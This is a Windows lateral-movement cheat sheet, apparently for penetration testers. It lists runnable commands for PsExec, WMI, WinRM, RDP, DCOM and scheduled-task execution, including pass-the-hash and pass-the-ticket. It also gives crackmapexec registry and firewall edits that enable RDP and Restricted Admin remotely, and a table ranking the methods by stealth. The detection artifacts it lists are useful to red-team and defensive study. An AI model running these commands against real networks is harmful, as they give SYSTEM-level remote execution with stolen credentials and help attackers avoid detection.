# Windows Lateral Movement Reference

## PsExec (SMB — Port 445)

### How It Works
Creates a Windows service on the remote host via SMB, uploads a binary, executes it,
and returns output. Returns a SYSTEM-level shell by default.

### Impacket PsExec
```
# With password
impacket-psexec domain/user:pass@<TARGET>
impacket-psexec domain/user:pass@<TARGET> 'whoami'     # Single command

# Pass-the-Hash
impacket-psexec -hashes :NTHASH domain/user@<TARGET>

# Pass-the-Ticket (Kerberos)
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/user@<TARGET>

# Specify share for upload (default: ADMIN$)
impacket-psexec domain/user:pass@<TARGET> -target-ip <IP> -port 445
```

### SysInternals PsExec
```
# From Windows
psexec.exe \\<TARGET> -u domain\user -p pass cmd.exe
psexec.exe \\<TARGET> -u domain\user -p pass -s cmd.exe       # SYSTEM context
psexec.exe \\<TARGET> -u domain\user -p pass -c program.exe   # Copy and execute
psexec.exe \\<TARGET> -accepteula -d -s cmd.exe /c "whoami > C:\Temp\out.txt"
```

### Artifacts
- Creates service: randomly named (Impacket) or PSEXESVC (SysInternals)
- Event logs: 7045 (service installed), 4624 type 3 (network logon)
- Leaves binary on disk until cleanup

---

## WMI Execution (Port 135 + Dynamic)

### Impacket wmiexec
```
# Semi-interactive shell — output via SMB share
impacket-wmiexec domain/user:pass@<TARGET>
impacket-wmiexec -hashes :NTHASH domain/user@<TARGET>
impacket-wmiexec -k -no-pass domain/user@<TARGET>
```

### Native WMI (from Windows)
```
# Remote process creation
wmic /node:<TARGET> /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\Temp\out.txt"

# PowerShell WMI
Invoke-WmiMethod -ComputerName <TARGET> -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Temp\out.txt" -Credential (Get-Credential)

# CIM (newer)
Invoke-CimMethod -ComputerName <TARGET> -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"} -Credential (Get-Credential)
```

### Artifacts
- No service creation, no binary upload
- Event logs: 4624 type 3, WMI event logs in Microsoft-Windows-WMI-Activity
- Output retrieval requires readable SMB share

---

## WinRM (Port 5985 HTTP / 5986 HTTPS)

### Evil-WinRM
```
# Password authentication
evil-winrm -i <TARGET> -u user -p 'Password1!'

# Pass-the-Hash
evil-winrm -i <TARGET> -u user -H NTHASH

# With scripts and executables
evil-winrm -i <TARGET> -u user -p pass -s /path/to/scripts/ -e /path/to/exes/

# SSL (port 5986)
evil-winrm -i <TARGET> -u user -p pass -S
```

### PowerShell Remoting
```
# Interactive session
Enter-PSSession -ComputerName <TARGET> -Credential domain\user

# Remote command execution
Invoke-Command -ComputerName <TARGET> -ScriptBlock { whoami; hostname } -Credential domain\user

# Multi-host execution
Invoke-Command -ComputerName host1,host2,host3 -ScriptBlock { hostname } -Credential domain\user

# Session persistence
$session = New-PSSession -ComputerName <TARGET> -Credential domain\user
Invoke-Command -Session $session -ScriptBlock { whoami }
Enter-PSSession -Session $session
```

### Requirements
- Target: WinRM service running, port 5985/5986 open
- User: Member of Remote Management Users or Administrators
- Enable remotely: `crackmapexec smb <TARGET> -u user -p pass -M winrm -o ACTION=enable`

---

## RDP (Port 3389)

### xfreerdp
```
# Standard connection
xfreerdp /u:user /p:'Password1!' /v:<TARGET>:3389 /dynamic-resolution

# Pass-the-Hash (requires Restricted Admin mode on target)
xfreerdp /u:user /pth:NTHASH /v:<TARGET>:3389

# Mount local drive
xfreerdp /u:user /p:pass /v:<TARGET> /drive:share,/tmp

# Clipboard sharing
xfreerdp /u:user /p:pass /v:<TARGET> +clipboard

# Enable Restricted Admin remotely (needed for PTH-RDP)
crackmapexec smb <TARGET> -u admin -p pass -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

### Enable RDP Remotely
```
crackmapexec smb <TARGET> -u user -p pass -M rdp -o ACTION=enable
# Or manually:
crackmapexec smb <TARGET> -u user -p pass -x 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
crackmapexec smb <TARGET> -u user -p pass -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=yes'
```

---

## DCOM Execution (Port 135 + Dynamic)

### Impacket dcomexec
```
impacket-dcomexec domain/user:pass@<TARGET>
impacket-dcomexec -hashes :NTHASH domain/user@<TARGET>

# Specify DCOM object (default: MMC20.Application)
impacket-dcomexec -object MMC20 domain/user:pass@<TARGET>
impacket-dcomexec -object ShellBrowserWindow domain/user:pass@<TARGET>
impacket-dcomexec -object ShellWindows domain/user:pass@<TARGET>
```

### Artifacts
- No service creation
- Uses COM objects for execution
- Event logs: 4624 type 3, DCOM-specific event logs

---

## Scheduled Tasks (Port 445 / 135)

### Impacket atexec
```
impacket-atexec domain/user:pass@<TARGET> 'whoami'
impacket-atexec -hashes :NTHASH domain/user@<TARGET> 'ipconfig /all'
```

### schtasks (native Windows)
```
# Create remote task
schtasks /create /s <TARGET> /u domain\user /p pass /tn "TaskName" /tr "cmd.exe /c whoami > C:\Temp\out.txt" /sc once /st 00:00 /ru SYSTEM

# Run it
schtasks /run /s <TARGET> /u domain\user /p pass /tn "TaskName"

# Clean up
schtasks /delete /s <TARGET> /u domain\user /p pass /tn "TaskName" /f
```

---

## OPSEC Comparison

| Method    | Port  | Artifacts           | Stealth | Shell Type   |
|-----------|-------|---------------------|---------|-------------- |
| PsExec    | 445   | Service + binary    | Low     | SYSTEM        |
| WMI       | 135   | No binary           | Medium  | Non-interactive |
| WinRM     | 5985  | PowerShell logs     | Medium  | Interactive   |
| RDP       | 3389  | Full GUI session    | Low     | Interactive   |
| DCOM      | 135   | COM object logs     | High    | Non-interactive |
| SMBExec   | 445   | Service (no binary) | Medium  | Non-interactive |
| AtExec    | 445   | Scheduled task      | Medium  | Non-interactive |
